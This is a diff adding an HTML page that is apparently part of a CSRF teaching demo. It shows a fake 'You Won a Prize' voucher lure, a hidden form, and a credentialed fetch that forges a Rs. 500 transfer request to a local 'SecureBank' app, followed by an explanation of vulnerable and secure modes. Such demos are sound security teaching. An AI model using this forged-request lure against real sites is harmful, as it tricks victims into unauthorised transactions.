@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Free Voucher — Claim Now!</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#f5f5f0;font-family:'Syne',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
+  .wrapper{max-width:700px;width:90%;padding:40px}
+  .attacker-label{font-family:'DM Mono',monospace;font-size:10px;color:#FF4757;letter-spacing:2px;text-transform:uppercase;background:rgba(255,71,87,.1);border:1px solid rgba(255,71,87,.3);padding:8px 16px;margin-bottom:32px;display:inline-block}
+  .fake-site{background:white;border-radius:4px;padding:40px;box-shadow:0 4px 40px rgba(0,0,0,.08);text-align:center}
+  .fake-logo{font-size:32px;margin-bottom:12px}
+  .fake-title{font-size:28px;font-weight:800;color:#111;margin-bottom:8px}
+  .fake-sub{color:#888;font-size:14px;margin-bottom:32px;font-family:'DM Mono',monospace}
+  .fake-voucher{background:linear-gradient(135deg,#FF6B6B,#FF4757);color:white;padding:24px;border-radius:4px;margin-bottom:32px}
+  .fake-voucher h3{font-size:22px;margin-bottom:4px}
+  .fake-voucher p{font-size:13px;opacity:.9;font-family:'DM Mono',monospace}
+  .fake-btn{display:block;width:100%;padding:16px;background:#2ecc71;color:white;border:none;font-family:'Syne',sans-serif;font-size:16px;font-weight:800;cursor:pointer;border-radius:4px;transition:background .2s}
+  .fake-btn:hover{background:#27ae60}
+  .hidden-form{display:none}
+  .result-box{margin-top:24px;padding:16px;border-radius:4px;font-family:'DM Mono',monospace;font-size:12px;display:none}
+  .result-box.success{background:#e8f5e9;border:1px solid #2ecc71;color:#1b5e20}
+  .result-box.error{background:#fde8e8;border:1px solid #FF4757;color:#b71c1c}
+  .explanation{margin-top:32px;background:#FFF9F9;border:1px solid rgba(255,71,87,.2);padding:24px;text-align:left}
+  .explanation h4{font-size:14px;color:#FF4757;margin-bottom:12px;font-family:'DM Mono',monospace;letter-spacing:1px;text-transform:uppercase}
+  .explanation p{font-size:12px;color:#666;line-height:1.7;font-family:'DM Mono',monospace;margin-bottom:8px}
+  .explanation code{background:#f0f0f0;padding:2px 6px;font-size:11px}
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="attacker-label">⚠ This is a simulated attacker page — CSRF Demo</div>
+
+  <div class="fake-site">
+    <div class="fake-logo">🎁</div>
+    <div class="fake-title">You Won a Prize!</div>
+    <div class="fake-sub">Click below to claim your free voucher</div>
+
+    <div class="fake-voucher">
+      <h3>Rs. 500 Cashback</h3>
+      <p>Limited time offer — expires in 10 minutes</p>
+    </div>
+
+    <button class="fake-btn" onclick="launchAttack()">
+      🎉 Claim My Voucher Now!
+    </button>
+
+    <form class="hidden-form" id="csrf-form" action="http://localhost:5000/transfer" method="POST">
+      <input type="hidden" name="receiver" value="admin">
+      <input type="hidden" name="amount" value="500">
+      <input type="hidden" name="note" value="CSRF Attack Transfer">
+    </form>
+
+    <div class="result-box" id="result"></div>
+  </div>
+
+  <div class="explanation">
+    <h4>What just happened?</h4>
+    <p>When you clicked "Claim Voucher", this page silently submitted a hidden form to <code>localhost:5000/transfer</code>.</p>
+    <p>In <strong>Vulnerable Mode</strong>: The transfer goes through because there is no CSRF token check.</p>
+    <p>In <strong>Secure Mode</strong>: The server rejects it — the request has no valid <code>csrf_token</code> matching the session.</p>
+    <p>This is a real CSRF attack. The victim never sees the form. They just clicked a button on a fake page.</p>
+  </div>
+</div>
+
+<script>
+function launchAttack() {
+  const resultBox = document.getElementById('result');
+  fetch('http://localhost:5000/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'receiver=admin&amount=500&note=CSRF+Attack'
+  }).then(r => r.json()).then(data => {
+    resultBox.style.display = 'block';
+    if (data.success) {
+      resultBox.className = 'result-box success';
+      resultBox.textContent = '✓ ATTACK SUCCEEDED — Rs.500 transferred to admin without your knowledge!';
+    } else if (data.blocked) {
+      resultBox.className = 'result-box error';
+      resultBox.textContent = '✗ ATTACK BLOCKED — CSRF token missing. Server rejected the forged request.';
+    } else {
+      resultBox.className = 'result-box error';
+      resultBox.textContent = 'Response: ' + JSON.stringify(data);
+    }
+  }).catch(() => {
+    resultBox.style.display = 'block';
+    resultBox.className = 'result-box error';
+    resultBox.textContent = 'Could not reach bank server. Make sure SecureBank is running on localhost:5000.';
+  });
+}
+</script>
+</body>
+</html>
